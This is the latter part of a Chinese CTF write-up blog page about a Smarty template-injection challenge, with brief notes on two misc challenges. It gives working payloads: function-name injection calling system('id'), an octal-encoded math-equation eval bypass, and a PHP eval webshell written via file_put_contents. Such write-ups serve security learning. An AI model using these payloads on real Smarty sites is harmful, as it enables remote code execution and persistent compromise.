+        data-srcset="https://img-blog.csdnimg.cn/c4b101e50064480a99cb294fd1d199ee.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/c4b101e50064480a99cb294fd1d199ee.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/c4b101e50064480a99cb294fd1d199ee.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/c4b101e50064480a99cb294fd1d199ee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>在我的测试下，这个payload是可以在3.1.38下打通的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{</span><span class="nx">function</span><span class="o">+</span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;rce(){};system(&#34;id&#34;);function+&#39;</span><span class="p">}{</span><span class="o">/</span><span class="nx">function</span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>打断点发现这个过滤的确会拦截，所以不能直接在3.1.39打通</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z0-9_\x80-\xff](.*)+$/&#39;</span><span class="p">,</span> <span class="nv">$_name</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>赛后复现，发现可以从math这里入手</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/78ca368e6db24c94a7d7842379b911f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/78ca368e6db24c94a7d7842379b911f0.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/78ca368e6db24c94a7d7842379b911f0.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/78ca368e6db24c94a7d7842379b911f0.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/78ca368e6db24c94a7d7842379b911f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>在function_math.php里面，有eval可以执行命令，但是这里有一个过滤</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/ac8b80e8ec5248a1942d64939e6245f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/ac8b80e8ec5248a1942d64939e6245f7.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/ac8b80e8ec5248a1942d64939e6245f7.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/ac8b80e8ec5248a1942d64939e6245f7.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/ac8b80e8ec5248a1942d64939e6245f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>这个过滤如果没过去，那么就会进入到error出去</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/285deff6b37445dba13880b3bcf3b973.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/285deff6b37445dba13880b3bcf3b973.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/285deff6b37445dba13880b3bcf3b973.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/285deff6b37445dba13880b3bcf3b973.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/285deff6b37445dba13880b3bcf3b973.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>这个可以用八进制去绕过</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/cae23279f4f94e7c86badf2ee6890682.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/cae23279f4f94e7c86badf2ee6890682.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/cae23279f4f94e7c86badf2ee6890682.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/cae23279f4f94e7c86badf2ee6890682.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/cae23279f4f94e7c86badf2ee6890682.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>可以看到生成了模板缓存文件，将执行的命令结果输出</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/beead5595ff94a2eb13ae7ddc02cd40a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/beead5595ff94a2eb13ae7ddc02cd40a.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/beead5595ff94a2eb13ae7ddc02cd40a.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/beead5595ff94a2eb13ae7ddc02cd40a.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/beead5595ff94a2eb13ae7ddc02cd40a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">data</span><span class="o">=</span><span class="p">{</span><span class="nv">$poc</span><span class="o">=</span><span class="s2">&#34;poc&#34;</span><span class="p">}{</span><span class="nx">math</span> <span class="nx">equation</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">171</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">155</span><span class="se">\&#34;</span><span class="s2">)(</span><span class="se">\&#34;\\</span><span class="s2">167</span><span class="se">\\</span><span class="s2">150</span><span class="se">\\</span><span class="s2">157</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">155</span><span class="se">\\</span><span class="s2">151</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/dfa857bb91e74c638e595dcba3d9d92d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/dfa857bb91e74c638e595dcba3d9d92d.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/dfa857bb91e74c638e595dcba3d9d92d.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/dfa857bb91e74c638e595dcba3d9d92d.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/dfa857bb91e74c638e595dcba3d9d92d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>拿flag写个马就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;1.php&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;?php eval(</span><span class="si">$_POST[&#39;a&#39;]</span><span class="s2">);?&gt;&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>转一下得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">eval</span><span class="o">:</span><span class="p">{</span><span class="nv">$poc</span><span class="o">=</span><span class="s2">&#34;poc&#34;</span><span class="p">}{</span><span class="nx">math</span> <span class="nx">equation</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">151</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">165</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">157</span><span class="se">\\</span><span class="s2">156</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">156</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">163</span><span class="se">\&#34;</span><span class="s2">)(</span><span class="se">\&#34;\\</span><span class="s2">31</span><span class="se">\\</span><span class="s2">2e</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">68</span><span class="se">\\</span><span class="s2">70</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;\\</span><span class="s2">74</span><span class="se">\\</span><span class="s2">77</span><span class="se">\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">150</span><span class="se">\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">40</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">166</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">50</span><span class="se">\\</span><span class="s2">44</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">120</span><span class="se">\\</span><span class="s2">117</span><span class="se">\\</span><span class="s2">123</span><span class="se">\\</span><span class="s2">124</span><span class="se">\\</span><span class="s2">133</span><span class="se">\\</span><span class="s2">47</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">47</span><span class="se">\\</span><span class="s2">135</span><span class="se">\\</span><span class="s2">51</span><span class="se">\\</span><span class="s2">73</span><span class="se">\\</span><span class="s2">77</span><span class="se">\\</span><span class="s2">76</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是这个就很奇怪，这样执行命令的话就不会经过他所修改的正则的方法里面，这是算一个非预期解吗</p>
+<h1 id="misc">Misc</h1>
+<h2 id="missingfile">MissingFile</h2>
+<p>直接文本搜索都有flag了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/1e4d0cfa4aa74c1ea7d15de9e26dc556.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/1e4d0cfa4aa74c1ea7d15de9e26dc556.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/1e4d0cfa4aa74c1ea7d15de9e26dc556.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/1e4d0cfa4aa74c1ea7d15de9e26dc556.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/1e4d0cfa4aa74c1ea7d15de9e26dc556.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<h2 id="重要系统复现">重要系统（复现）</h2>
+<p>有键盘流量</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/0fd9beb4befd4a9482183b60c6149128.png"
+        data-srcset="https://img-blog.csdnimg.cn/0fd9beb4befd4a9482183b60c6149128.png, https://img-blog.csdnimg.cn/0fd9beb4befd4a9482183b60c6149128.png 1.5x, https://img-blog.csdnimg.cn/0fd9beb4befd4a9482183b60c6149128.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/0fd9beb4befd4a9482183b60c6149128.png"
+        title="在这里插入图片描述" /></p>
+<p>连接上ssh后，不需要提权能直接grep到flag。。。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-03-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/java%E5%AE%89%E5%85%A8_%E5%8F%8D%E5%B0%84/" class="prev" rel="prev" title="[Java安全]反射"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Java安全]反射</a>
+            <a href="/suctf2022/" class="next" rel="next" title="[SUCTF2022] WP">[SUCTF2022] WP<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">赣ICP备2021001334号</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
